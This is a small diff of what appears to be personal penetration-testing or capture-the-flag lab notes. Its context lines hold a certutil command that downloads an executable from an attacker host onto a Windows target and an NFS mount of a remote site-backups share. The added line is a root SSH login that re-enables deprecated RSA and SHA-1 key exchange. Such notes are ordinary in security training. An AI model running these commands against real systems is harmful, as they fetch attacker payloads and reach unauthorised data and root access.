@@ -9,3 +9,5 @@ certutil -urlcache -split -f "http://10.10.15.244/devel.exe" devel.exe
 
 cd /tmp;sudo mkdir baba
 sudo mount -t nfs -o vers=3 10.129.230.172:/site_backups /tmp/baba/
+
+ssh root@10.129.229.183 -o PubkeyAcceptedAlgorithms=+ssh-rsa -o HostKeyAlgorithms=+ssh-rsa -o KexAlgorithms=+diffie-hellman-group1-sha1
